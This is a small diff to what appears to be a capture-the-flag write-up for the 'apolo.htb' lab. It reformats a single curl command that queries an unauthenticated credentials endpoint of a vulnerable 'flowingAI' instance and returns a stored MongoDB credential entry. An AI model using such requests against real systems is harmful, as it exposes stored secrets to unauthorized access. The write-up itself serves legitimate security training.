@@ -59,7 +59,7 @@ Checking the version number of the flowingAI instance revealed that it was vulne
 After using the POC on the website we can confirm that it's indeed vulnerable
  
 ```
-curl [http://ai.apolo.htb/Api/v1/credentials](http://ai.apolo.htb/Api/v1/credentials) [{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}`
+curl http://ai.apolo.htb/Api/v1/credentials [{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}`
 ```
 ## User flag
 
